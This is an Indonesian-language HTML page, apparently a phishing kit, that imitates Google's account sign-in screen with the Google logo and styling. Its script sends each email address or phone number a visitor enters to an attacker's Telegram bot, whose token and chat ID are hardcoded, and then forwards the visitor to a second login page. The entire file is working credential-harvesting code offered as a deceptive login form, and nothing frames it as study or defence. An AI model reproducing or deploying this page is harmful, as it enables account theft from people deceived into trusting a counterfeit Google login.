<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#fff;
    min-height:100vh;
}

.container{
    width:100%;
    max-width:480px;
    margin:0 auto;
    padding:40px 24px;
}

.logo{
    width:70px;
    margin-bottom:40px;
}

h1{
    font-size:48px;
    font-weight:400;
    color:#202124;
    margin-bottom:20px;
}

.subtitle{
    font-size:20px;
    color:#202124;
    margin-bottom:40px;
}

.input-box{
    width:100%;
    height:58px;
    border:1px solid #9aa0a6;
    border-radius:4px;
    padding:0 16px;
    font-size:20px;
    outline:none;
}

.input-box:focus{
    border:2px solid #1a73e8;
}

.link{
    display:inline-block;
    margin-top:12px;
    color:#1a73e8;
    text-decoration:none;
    font-size:18px;
    font-weight:500;
}

.info{
    margin-top:80px;
    line-height:1.5;
    font-size:18px;
    color:#5f6368;
}

.info a{
    color:#1a73e8;
    text-decoration:none;
}

.bottom{
    margin-top:100px;
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.create{
    color:#1a73e8;
    text-decoration:none;
    font-size:20px;
}

.btn{
    border:none;
    background:#1a73e8;
    color:white;
    padding:16px 40px;
    border-radius:30px;
    font-size:20px;
    cursor:pointer;
}
</style>
</head>
<body>

<div class="container">

    <img class="logo"
    src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"
    alt="Logo">

    <h1>Login</h1>

    <div class="subtitle">
        Gunakan Akun Anda
    </div>

    <input
        type="text"
        id="email"
        class="input-box"
        placeholder="Email atau nomor telepon">

    <br>

    <a href="#" class="link">Lupa email?</a>

    <div class="info">
        Bukan komputer Anda? Gunakan mode tamu untuk login secara pribadi.
        <a href="#">Pelajari lebih lanjut</a>
    </div>

    <div class="bottom">
        <a href="#" class="create">Buat akun</a>

        <button class="btn" onclick="simpanEmail()">
            Berikutnya
        </button>
    </div>

</div>

<script>
    // ----------------------------
    // KONFIGURASI TELEGRAM ANDA
    // ----------------------------
    const botToken = '8824816621%3AAAF7kLSbFOHiibnFHAelyYwspJ7txEQFgVk'; // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2vT
    const chatId = '7549590022';       // Contoh: 123456789 (angka saja)
    // ----------------------------

    async function simpanEmail() {
        const email = document.getElementById('email').value.trim();

        if (!email) {
            alert('Masukkan email atau nomor telepon');
            return;
        }

        // Membuat pesan yang akan dikirim
        const textMessage = `🔔 <b>Data Login Baru</b>\n\nEmail: ${email}`;
        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=HTML`;

        try {
            // Mengirim data ke Telegram API
            const response = await fetch(apiUrl);
            const result = await response.json();

            if (result.ok) {
                window.location.href = "login.html";
                console.log("Sent to Telegram:", email);
            } else {
                alert('Gagal mengirim ke Telegram. Cek console untuk detail.');
                console.error(result);
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Terjadi kesalahan saat menghubungi server Telegram.');
        }
    }
</script>

</body>
</html>
